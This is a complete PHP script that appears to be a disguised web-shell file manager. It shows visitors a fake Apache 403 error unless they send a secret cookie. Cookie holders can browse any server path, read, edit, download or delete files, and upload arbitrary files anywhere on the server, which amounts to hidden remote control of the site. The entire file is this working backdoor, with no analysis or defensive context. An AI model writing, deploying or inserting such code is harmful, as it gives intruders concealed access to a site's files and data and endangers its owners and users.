<?php
session_start();

if (!isset($_COOKIE['name']) || $_COOKIE['name'] !== '945') {
    header('HTTP/1.1 403 Forbidden');
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don\'t have permission to access this resource.</p>
</body></html>';
    exit;
}

/**
 * Get the real IP address of the client.
 *
 * @return string Client IP address.
 */
function get_real_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

/**
 * Display the contents of a directory as an HTML table.
 *
 * @param string $dir Directory path.
 * @return void
 */
function list_directory($dir) {
    $real_path = realpath($dir);
    
    if (!$real_path || !is_dir($real_path)) {
        echo '<div class="alert alert-error">Directory does not exist or is not accessible.</div>';
        return;
    }
    
    $files = @scandir($real_path);
    
    if ($files === false) {
        echo '<div class="alert alert-error">Cannot read directory contents. Permission denied.</div>';
        return;
    }
    
    $folders = [];
    $regular_files = [];

    foreach ($files as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }
        $path = $real_path . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            $folders[] = $file;
        } else {
            $regular_files[] = $file;
        }
    }

    sort($folders);
    sort($regular_files);
    
    echo '<table class="file-table">';
    echo '<thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr></thead>';
    echo '<tbody>';

    $parent_dir = dirname($real_path);
    if ($real_path !== $parent_dir) {
        echo '<tr class="up-row">';
        echo '<td colspan="4"><a href="?dir=' . urlencode($parent_dir) . '">..</a></td>';
        echo '</tr>';
    }

    foreach ($folders as $folder) {
        $path = $real_path . DIRECTORY_SEPARATOR . $folder;
        echo '<tr class="folder-row">';
        echo '<td class="name"><a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($folder) . '/</a></td>';
        echo '<td>DIR</td>';
        echo '<td>-</td>';
        echo '<td class="actions">';
        echo '<a href="?dir=' . urlencode($real_path) . '&folder=' . urlencode($folder) . '&action=rename_folder" class="btn btn-sm btn-warning">Rename</a> | ';
        echo '<a href="?dir=' . urlencode($real_path) . '&folder=' . urlencode($folder) . '&action=delete_folder" class="btn btn-sm btn-danger" onclick="return confirm(\'Delete folder?\')">Delete</a>';
        echo '</td>';
        echo '</tr>';
    }

    foreach ($regular_files as $file) {
        $path = $real_path . DIRECTORY_SEPARATOR . $file;
        $size = @filesize($path);
        $size_formatted = $size !== false ? format_size($size) : 'N/A';
        echo '<tr class="file-row">';
        echo '<td class="name">' . htmlspecialchars($file) . '</td>';
        echo '<td>FILE</td>';
        echo '<td>' . $size_formatted . '</td>';
        echo '<td class="actions">';
        echo '<a href="?dir=' . urlencode($real_path) . '&file=' . urlencode($file) . '&action=edit" class="btn btn-sm btn-primary">Edit</a> | ';
        echo '<a href="?dir=' . urlencode($real_path) . '&file=' . urlencode($file) . '&action=rename" class="btn btn-sm btn-warning">Rename</a> | ';
        echo '<a href="?dir=' . urlencode($real_path) . '&file=' . urlencode($file) . '&action=download" class="btn btn-sm btn-success">Download</a> | ';
        echo '<a href="?dir=' . urlencode($real_path) . '&file=' . urlencode($file) . '&action=delete" class="btn btn-sm btn-danger" onclick="return confirm(\'Delete file?\')">Delete</a>';
        echo '</td>';
        echo '</tr>';
    }
    
    echo '</tbody>';
    echo '</table>';

    $total_items = count($folders) + count($regular_files);
    echo '<div style="margin-top: 15px; color: #666; font-size: 12px;">';
    echo 'Total: ' . count($folders) . ' folder(s), ' . count($regular_files) . ' file(s)';
    echo '</div>';
}

/**
 * Format a number of bytes into a human-readable size string.
 *
 * @param int $bytes Number of bytes.
 * @return string Formatted size.
 */
function format_size($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

/**
 * Delete a file from the specified directory.
 *
 * @param string $dir  Directory path.
 * @param string $file File name to delete.
 * @return void
 */
function delete_file($dir, $file) {
    $real_path = realpath($dir);
    $path = $real_path . DIRECTORY_SEPARATOR . $file;
    if (is_file($path)) {
        unlink($path);
        echo "<div class='alert alert-success'>File '$file' deleted successfully.</div>";
    } else {
        echo "<div class='alert alert-error'>File '$file' does not exist.</div>";
    }
}

/**
 * Delete a folder from the specified directory.
 *
 * @param string $dir    Directory path.
 * @param string $folder Folder name to delete.
 * @return void
 */
function delete_folder($dir, $folder) {
    $real_path = realpath($dir);
    $path = $real_path . DIRECTORY_SEPARATOR . $folder;
    if (is_dir($path)) {
        if (rmdir($path)) {
            echo "<div class='alert alert-success'>Folder '$folder' deleted successfully.</div>";
        } else {
            echo "<div class='alert alert-error'>Cannot delete folder '$folder'. Make sure it's empty.</div>";
        }
    } else {
        echo "<div class='alert alert-error'>Folder '$folder' does not exist.</div>";
    }
}

/**
 * Rename a file in the specified directory.
 *
 * @param string $dir      Directory path.
 * @param string $file     Existing file name.
 * @param string $new_name New file name.
 * @return void
 */
function rename_file($dir, $file, $new_name) {
    $real_path = realpath($dir);
    $old_path = $real_path . DIRECTORY_SEPARATOR . $file;
    $new_path = $real_path . DIRECTORY_SEPARATOR . $new_name;
    if (is_file($old_path)) {
        rename($old_path, $new_path);
        echo "<div class='alert alert-success'>File '$file' renamed to '$new_name' successfully.</div>";
    } else {
        echo "<div class='alert alert-error'>File '$file' does not exist.</div>";
    }
}

/**
 * Rename a folder in the specified directory.
 *
 * @param string $dir      Directory path.
 * @param string $folder   Existing folder name.
 * @param string $new_name New folder name.
 * @return void
 */
function rename_folder($dir, $folder, $new_name) {
    $real_path = realpath($dir);
    $old_path = $real_path . DIRECTORY_SEPARATOR . $folder;
    $new_path = $real_path . DIRECTORY_SEPARATOR . $new_name;
    if (is_dir($old_path)) {
        rename($old_path, $new_path);
        echo "<div class='alert alert-success'>Folder '$folder' renamed to '$new_name' successfully.</div>";
    } else {
        echo "<div class='alert alert-error'>Folder '$folder' does not exist.</div>";
    }
}

/**
 * Create a new empty file in the specified directory.
 *
 * @param string $dir      Directory path.
 * @param string $filename File name to create.
 * @return void
 */
function create_file($dir, $filename) {
    $real_path = realpath($dir);
    $path = $real_path . DIRECTORY_SEPARATOR . $filename;
    if (!file_exists($path)) {
        file_put_contents($path, '');
        echo "<div class='alert alert-success'>File '$filename' created successfully.</div>";
    } else {
        echo "<div class='alert alert-error'>File '$filename' already exists.</div>";
    }
}

/**
 * Create a new folder in the specified directory.
 *
 * @param string $dir        Directory path.
 * @param string $foldername Folder name to create.
 * @return void
 */
function create_folder($dir, $foldername) {
    $real_path = realpath($dir);
    $path = $real_path . DIRECTORY_SEPARATOR . $foldername;
    if (!file_exists($path)) {
        mkdir($path);
        echo "<div class='alert alert-success'>Folder '$foldername' created successfully.</div>";
    } else {
        echo "<div class='alert alert-error'>Folder '$foldername' already exists.</div>";
    }
}

/**
 * Upload a file to a directory on the server.
 *
 * @param string      $dir        Source directory path.
 * @param string|null $target_dir Optional target directory path.
 * @return void
 */
function upload_file($dir, $target_dir = null) {
    $real_path = realpath($dir);
    $upload_dir = $target_dir ? realpath($target_dir) : $real_path;
    
    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
        $filename = basename($_FILES['upload_file']['name']);
        $target_path = $upload_dir . DIRECTORY_SEPARATOR . $filename;
        
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_path)) {
            echo "<div class='alert alert-success'>File '$filename' uploaded successfully.</div>";
        } else {
            echo "<div class='alert alert-error'>Failed to upload file.</div>";
        }
    } else {
        echo "<div class='alert alert-error'>No file selected or upload error.</div>";
    }
}

/**
 * Send a file download response for a given file.
 *
 * @param string $dir  Directory path.
 * @param string $file File name to download.
 * @return void
 */
function download_file($dir, $file) {
    $real_path = realpath($dir);
    $path = $real_path . DIRECTORY_SEPARATOR . $file;
    if (is_file($path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;
    }
}

/**
 * Display an edit form for the specified file.
 *
 * @param string $dir  Directory path.
 * @param string $file File name to edit.
 * @return void
 */
function edit_file($dir, $file) {
    $real_path = realpath($dir);
    $path = $real_path . DIRECTORY_SEPARATOR . $file;
    if (is_file($path)) {
        $content = file_get_contents($path);
        echo '<form method="post" action="?dir=' . urlencode($real_path) . '&file=' . urlencode($file) . '&action=save" class="edit-form">';
        echo '<div class="form-group">';
        echo '<label>Editing: <strong>' . htmlspecialchars($file) . '</strong></label>';
        echo '<textarea name="content" rows="25">' . htmlspecialchars($content) . '</textarea>';
        echo '</div>';
        echo '<div class="form-actions">';
        echo '<button type="submit" class="btn btn-primary">Save Changes</button> ';
        echo '<a href="?dir=' . urlencode($real_path) . '" class="btn btn-secondary">Cancel</a>';
        echo '</div>';
        echo '</form>';
    } else {
        echo "<div class='alert alert-error'>File '$file' does not exist.</div>";
    }
}

/**
 * Save content to a file.
 *
 * @param string $dir     Directory path.
 * @param string $file    File name to save.
 * @param string $content Content to write.
 * @return void
 */
function save_file($dir, $file, $content) {
    $real_path = realpath($dir);
    $path = $real_path . DIRECTORY_SEPARATOR . $file;
    if (is_file($path)) {
        file_put_contents($path, $content);
        echo "<div class='alert alert-success'>File '$file' saved successfully.</div>";
    } else {
        echo "<div class='alert alert-error'>File '$file' does not exist.</div>";
    }
}

/**
 * Build a breadcrumb navigation string for a directory path.
 *
 * @param string $dir Directory path.
 * @return string HTML breadcrumb markup.
 */
function build_breadcrumb($dir) {
    $real_path = realpath($dir);
    if (!$real_path) {
        return htmlspecialchars($dir);
    }
    
    $path = str_replace('\\', '/', $real_path);
    $parts = explode('/', $path);
    $breadcrumb = '';
    $current_parts = [];
    
    foreach ($parts as $index => $part) {
        if (empty($part) && $index !== 0) continue;
        
        $current_parts[] = $part;

        if ($index == 0 && empty($part)) {
            $current_path = '/';
        } elseif ($index == 0 && strlen($part) == 2 && isset($part[1]) && $part[1] == ':') {
            $current_path = $part;
        } else {
            $current_path = implode('/', $current_parts);
            if ($current_path[0] !== '/' && strpos($current_path, ':') === false) {
                $current_path = '/' . $current_path;
            }
        }
        
        $display_part = empty($part) ? '/' : htmlspecialchars($part);
        $is_last = true;
        for ($j = $index + 1; $j < count($parts); $j++) {
            if (!empty($parts[$j])) {
                $is_last = false;
                break;
            }
        }
        
        if (!$is_last) {
            $breadcrumb .= '<a href="?dir=' . urlencode($current_path) . '">' . $display_part . '</a> / ';
        } else {
            $breadcrumb .= '<strong>' . $display_part . '</strong>';
        }
    }
    
    return $breadcrumb;
}

/**
 * Retrieve all subdirectories recursively under a base directory.
 *
 * @param string $base_dir Base directory path.
 * @param string $prefix   Optional prefix for recursion (unused).
 * @return array List of directory paths.
 */
function get_all_directories($base_dir, $prefix = '') {
    $dirs = [];
    $real_base = realpath($base_dir);
    
    if (!$real_base || !is_dir($real_base)) {
        return $dirs;
    }
    
    $items = @scandir($real_base);
    if ($items === false) {
        return $dirs;
    }
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        $path = $real_base . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            $dirs[] = $path;
            $subdirs = get_all_directories($path);
            $dirs = array_merge($dirs, $subdirs);
        }
    }
    return $dirs;
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$action = isset($_GET['action']) ? $_GET['action'] : '';
$file = isset($_GET['file']) ? $_GET['file'] : '';
$folder = isset($_GET['folder']) ? $_GET['folder'] : '';

if ($action == 'download' && $file) {
    download_file($dir, $file);
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #e5e5e5;
            color: #333;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #fff;
            border-radius: 4px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .header {
            background: #4a4a4a;
            color: #fff;
            padding: 20px 30px;
            border-bottom: 2px solid #666;
        }
        
        .header h1 {
            font-size: 22px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .header-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 13px;
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid rgba(255, 255, 255, 0.15);
        }
        
        .server-ip {
            background: rgba(255, 255, 255, 0.1);
            padding: 6px 12px;
            border-radius: 3px;
            font-family: "Courier New", monospace;
            font-size: 12px;
        }
        
        .breadcrumbs {
            background: #f5f5f5;
            padding: 12px 30px;
            border-bottom: 1px solid #d0d0d0;
            font-size: 13px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .breadcrumbs-path {
            flex: 1;
        }
        
        .breadcrumbs a {
            color: #555;
            text-decoration: none;
        }
        
        .breadcrumbs a:hover {
            color: #000;
            text-decoration: underline;
        }
        
        .breadcrumbs strong {
            color: #000;
        }
        
        .btn-go-up {
            background: #888;
            color: #fff;
            padding: 6px 14px;
            border-radius: 3px;
            text-decoration: none;
            font-size: 12px;
            font-weight: 500;
            transition: background 0.2s;
            white-space: nowrap;
        }
        
        .btn-go-up:hover {
            background: #666;
        }
        
        .content {
            padding: 25px;
        }
        
        .actions-panel {
            background: #f9f9f9;
            border: 1px solid #d0d0d0;
            border-radius: 4px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .actions-panel h3 {
            margin-bottom: 15px;
            color: #333;
            font-size: 16px;
            font-weight: 600;
        }
        
        .action-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 15px;
        }
        
        .action-form {
            background: #fff;
            border: 1px solid #d0d0d0;
            border-radius: 4px;
            padding: 15px;
        }
        
        .action-form h4 {
            margin-bottom: 10px;
            color: #444;
            font-size: 13px;
            font-weight: 600;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: #444;
            font-size: 13px;
        }
        
        input[type="text"],
        input[type="file"],
        select,
        textarea {
            width: 100%;
            padding: 8px 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 13px;
            font-family: inherit;
            transition: border-color 0.2s;
        }
        
        input[type="text"]:focus,
        input[type="file"]:focus,
        select:focus,
        textarea:focus {
            outline: none;
            border-color: #888;
        }
        
        textarea {
            font-family: "Consolas", "Monaco", "Courier New", monospace;
            resize: vertical;
            line-height: 1.4;
        }
        
        .btn {
            display: inline-block;
            padding: 8px 16px;
            background: #666;
            color: #fff;
            text-decoration: none;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 500;
            transition: background 0.2s;
            text-align: center;
        }
        
        .btn:hover {
            background: #555;
        }
        
        .btn-primary { background: #666; }
        .btn-primary:hover { background: #555; }
        
        .btn-success { background: #777; }
        .btn-success:hover { background: #666; }
        
        .btn-warning { background: #888; }
        .btn-warning:hover { background: #777; }
        
        .btn-danger { background: #999; }
        .btn-danger:hover { background: #888; }
        
        .btn-secondary { background: #aaa; }
        .btn-secondary:hover { background: #999; }
        
        .btn-sm {
            padding: 5px 10px;
            font-size: 12px;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
            background: #fff;
            border: 1px solid #d0d0d0;
        }
        
        .file-table thead {
            background: #5a5a5a;
            color: #fff;
        }
        
        .file-table thead th {
            padding: 12px 15px;
            text-align: left;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            border-bottom: 2px solid #444;
        }
        
        .file-table tbody tr {
            border-bottom: 1px solid #e0e0e0;
            transition: background-color 0.15s;
        }
        
        .file-table tbody tr:hover {
            background-color: #f5f5f5;
        }
        
        .file-table tbody td {
            padding: 10px 15px;
            font-size: 13px;
        }
        
        .file-table .name {
            font-weight: 500;
            color: #333;
        }
        
        .file-table .name a {
            color: #444;
            text-decoration: none;
            transition: color 0.2s;
        }
        
        .file-table .name a:hover {
            color: #000;
            text-decoration: underline;
        }
        
        .folder-row {
            background-color: #fafafa;
        }
        
        .folder-row .name {
            font-weight: 600;
        }
        
        .up-row {
            background-color: #f0f0f0;
            font-weight: 600;
        }
        
        .up-row a {
            color: #333;
            text-decoration: none;
            font-size: 14px;
        }
        
        .up-row a:hover {
            color: #000;
        }
        
        .actions {
            white-space: nowrap;
        }
        
        .alert {
            padding: 12px 16px;
            border-radius: 3px;
            margin-bottom: 15px;
            font-weight: 500;
            font-size: 13px;
        }
        
        .alert-success {
            background: #e8e8e8;
            border: 1px solid #ccc;
            color: #333;
        }
        
        .alert-error {
            background: #f0f0f0;
            border: 1px solid #bbb;
            color: #333;
        }
        
        .edit-form {
            background: #fff;
            padding: 20px;
            border-radius: 4px;
            border: 1px solid #d0d0d0;
        }
        
        .form-actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        
        @media (max-width: 768px) {
            .header-info {
                flex-direction: column;
                gap: 10px;
                align-items: flex-start;
            }
            
            .breadcrumbs {
                flex-direction: column;
                gap: 10px;
                align-items: flex-start;
            }
            
            .breadcrumbs-path {
                width: 100%;
            }
            
            .action-buttons {
                grid-template-columns: 1fr;
            }
            
            .file-table {
                font-size: 12px;
            }
            
            .file-table thead th,
            .file-table tbody td {
                padding: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
        <h1>File Manager</h1>
            <div class="header-info">
                <div>
                    <strong>Server IP:</strong> <?php echo get_real_ip(); ?>
                </div>
            </div>
        </div>
        
        <div class="breadcrumbs">
            <div class="breadcrumbs-path">
                <?php echo build_breadcrumb($dir); ?>
            </div>
            <?php 
            $real_path = realpath($dir);
            $parent_dir = dirname($real_path);
            if ($real_path !== $parent_dir) {
                echo '<a href="?dir=' . urlencode($parent_dir) . '" class="btn-go-up">Go Up</a>';
            }
            ?>
        </div>
        
        <div class="content">
        <?php
            if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                if (isset($_POST['new_name']) && $action == 'rename' && $file) {
                    rename_file($dir, $file, $_POST['new_name']);
                } elseif (isset($_POST['new_folder_name']) && $action == 'rename_folder' && $folder) {
                    rename_folder($dir, $folder, $_POST['new_folder_name']);
                } elseif (isset($_POST['filename']) && $_POST['action_type'] == 'create_file') {
                    create_file($dir, $_POST['filename']);
                } elseif (isset($_POST['foldername']) && $_POST['action_type'] == 'create_folder') {
                    create_folder($dir, $_POST['foldername']);
                } elseif (isset($_FILES['upload_file']) && $_POST['action_type'] == 'upload_file') {
                    $target_upload_dir = isset($_POST['upload_target_dir']) ? $_POST['upload_target_dir'] : $dir;
                    upload_file($dir, $target_upload_dir);
                }
            }

            if ($action == 'delete' && $file) {
                delete_file($dir, $file);
            } elseif ($action == 'delete_folder' && $folder) {
                delete_folder($dir, $folder);
            } elseif ($action == 'save' && $file && isset($_POST['content'])) {
                save_file($dir, $file, $_POST['content']);
            }

            $current_real_path = realpath($dir);
            
            if ($action == 'rename' && $file) {
                echo '<div class="edit-form">';
                echo '<h3>Rename File</h3>';
                echo '<form method="post" action="?dir=' . urlencode($current_real_path) . '&file=' . urlencode($file) . '&action=rename">';
                echo '<div class="form-group">';
                echo '<label>Current name: <strong>' . htmlspecialchars($file) . '</strong></label>';
                echo '<label>New name:</label>';
                echo '<input type="text" name="new_name" value="' . htmlspecialchars($file) . '" required>';
                echo '</div>';
                echo '<div class="form-actions">';
                echo '<button type="submit" class="btn btn-primary">Rename</button> ';
                echo '<a href="?dir=' . urlencode($current_real_path) . '" class="btn btn-secondary">Cancel</a>';
                echo '</div>';
                echo '</form>';
                echo '</div>';
            } elseif ($action == 'rename_folder' && $folder) {
                echo '<div class="edit-form">';
                echo '<h3>Rename Folder</h3>';
                echo '<form method="post" action="?dir=' . urlencode($current_real_path) . '&folder=' . urlencode($folder) . '&action=rename_folder">';
                echo '<div class="form-group">';
                echo '<label>Current name: <strong>' . htmlspecialchars($folder) . '</strong></label>';
                echo '<label>New name:</label>';
                echo '<input type="text" name="new_folder_name" value="' . htmlspecialchars($folder) . '" required>';
                echo '</div>';
                echo '<div class="form-actions">';
                echo '<button type="submit" class="btn btn-primary">Rename</button> ';
                echo '<a href="?dir=' . urlencode($current_real_path) . '" class="btn btn-secondary">Cancel</a>';
                echo '</div>';
                echo '</form>';
                echo '</div>';
            } elseif ($action == 'edit' && $file) {
                edit_file($dir, $file);
            } else {
                echo '<div class="actions-panel">';
                echo '<h3>Quick Actions</h3>';
                echo '<div class="action-buttons">';
                echo '<div class="action-form">';
                echo '<h4>Create New File</h4>';
                echo '<form method="post" action="?dir=' . urlencode($current_real_path) . '">';
                echo '<input type="hidden" name="action_type" value="create_file">';
                echo '<input type="text" name="filename" placeholder="filename.txt" required>';
                echo '<button type="submit" class="btn btn-success" style="width: 100%; margin-top: 10px;">Create File</button>';
                echo '</form>';
                echo '</div>';
                echo '<div class="action-form">';
                echo '<h4>Create New Folder</h4>';
                echo '<form method="post" action="?dir=' . urlencode($current_real_path) . '">';
                echo '<input type="hidden" name="action_type" value="create_folder">';
                echo '<input type="text" name="foldername" placeholder="folder-name" required>';
                echo '<button type="submit" class="btn btn-success" style="width: 100%; margin-top: 10px;">Create Folder</button>';
                echo '</form>';
                echo '</div>';
                echo '<div class="action-form">';
                echo '<h4>Upload File</h4>';
                echo '<form method="post" action="?dir=' . urlencode($current_real_path) . '" enctype="multipart/form-data">';
                echo '<input type="hidden" name="action_type" value="upload_file">';
                echo '<select name="upload_target_dir" style="margin-bottom: 10px;">';
                echo '<option value="' . htmlspecialchars($current_real_path) . '">Current Directory</option>';
                $all_dirs = get_all_directories($current_real_path);
                sort($all_dirs);
                $max_dirs = 50;
                $count = 0;
                foreach ($all_dirs as $d) {
                    if ($count >= $max_dirs) {
                        echo '<option disabled>... (more directories available)</option>';
                        break;
                    }
                    $display_path = str_replace($current_real_path, '.', $d);
                    echo '<option value="' . htmlspecialchars($d) . '">' . htmlspecialchars($display_path) . '</option>';
                    $count++;
                }
                echo '</select>';
                echo '<input type="file" name="upload_file" required>';
                echo '<button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 10px;">Upload</button>';
                echo '</form>';
                echo '</div>';
                
                echo '</div>';
                echo '</div>';

                list_directory($dir);
        }
        ?>
        </div>
    </div>
</body>
</html>